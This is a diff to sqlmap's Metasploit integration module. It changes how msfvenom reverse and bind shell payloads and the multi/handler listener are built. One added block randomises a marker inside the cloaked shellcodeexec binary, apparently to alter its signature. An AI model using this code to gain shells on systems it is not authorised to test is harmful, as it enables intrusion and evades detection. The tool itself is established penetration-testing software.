@@ -1,17 +1,21 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
 import os
 import re
+import select
 import sys
+import tempfile
 import time
 
 from subprocess import PIPE
 
+from extra.cloak.cloak import cloak
+from extra.cloak.cloak import decloak
 from lib.core.common import dataToStdout
 from lib.core.common import Backend
 from lib.core.common import getLocalIP
@@ -34,6 +38,7 @@ from lib.core.exception import SqlmapFilePathException
 from lib.core.exception import SqlmapGenericException
 from lib.core.settings import IS_WIN
 from lib.core.settings import METASPLOIT_SESSION_TIMEOUT
+from lib.core.settings import SHELLCODEEXEC_RANDOM_STRING_MARKER
 from lib.core.settings import UNICODE_ENCODING
 from lib.core.subprocessng import blockingReadFromFD
 from lib.core.subprocessng import blockingWriteToFD
@@ -43,8 +48,6 @@ from lib.core.subprocessng import recv_some
 
 if IS_WIN:
     import msvcrt
-else:
-    from select import select
 
 class Metasploit:
     """
@@ -288,7 +291,7 @@ class Metasploit:
 
     def _selectRhost(self):
         if self.connectionStr.startswith("bind"):
-            message = "what is the back-end DBMS address? [%s] " % self.remoteIP
+            message = "what is the back-end DBMS address? [Enter for '%s' (detected)] " % self.remoteIP
             address = readInput(message, default=self.remoteIP)
 
             if not address:
@@ -304,7 +307,7 @@ class Metasploit:
 
     def _selectLhost(self):
         if self.connectionStr.startswith("reverse"):
-            message = "what is the local address? [%s] " % self.localIP
+            message = "what is the local address? [Enter for '%s' (detected)] " % self.localIP
             address = readInput(message, default=self.localIP)
 
             if not address:
@@ -348,7 +351,7 @@ class Metasploit:
 
             self._cliCmd += " E"
         else:
-            self._cliCmd = "%s -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd = "%s -L -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
             self._cliCmd += "; set EXITFUNC %s" % exitfunc
             self._cliCmd += "; set LPORT %s" % self.portStr
 
@@ -426,10 +429,12 @@ class Metasploit:
                 self._payloadCmd += " X > \"%s\"" % outFile
         else:
             if extra == "BufferRegister=EAX":
-                self._payloadCmd += " -a x86 -e %s -f %s > \"%s\"" % (self.encoderStr, format, outFile)
+                self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)
 
                 if extra is not None:
                     self._payloadCmd += " %s" % extra
+
+                self._payloadCmd += " > \"%s\"" % outFile
             else:
                 self._payloadCmd += " -f exe > \"%s\"" % outFile
 
@@ -546,7 +551,7 @@ class Metasploit:
                             # Probably the child has exited
                             pass
                 else:
-                    ready_fds = select([stdin_fd], [], [], 1)
+                    ready_fds = select.select([stdin_fd], [], [], 1)
 
                     if stdin_fd in ready_fds[0]:
                         try:
@@ -594,8 +599,10 @@ class Metasploit:
                     else:
                         proc.kill()
 
-            except (EOFError, IOError):
+            except (EOFError, IOError, select.error):
                 return proc.returncode
+            except KeyboardInterrupt:
+                pass
 
     def createMsfShellcode(self, exitfunc, format, extra, encode):
         infoMsg = "creating Metasploit Framework multi-stage shellcode "
@@ -615,7 +622,7 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        match = re.search("(Total size:|Length:|succeeded with size) ([\d]+)", payloadStderr)
+        match = re.search("(Total size:|Length:|succeeded with size|Final size of exe file:) ([\d]+)", payloadStderr)
 
         if match:
             payloadSize = int(match.group(2))
@@ -640,6 +647,14 @@ class Metasploit:
 
         if Backend.isOs(OS.WINDOWS):
             self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
+            content = decloak(self.shellcodeexecLocal)
+            if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:
+                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
+                _ = cloak(data=content)
+                handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix="%s.exe_" % "32")
+                os.close(handle)
+                with open(self.shellcodeexecLocal, "w+b") as f:
+                    f.write(_)
         else:
             self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "linux", "shellcodeexec.x%s_" % Backend.getArch())
 
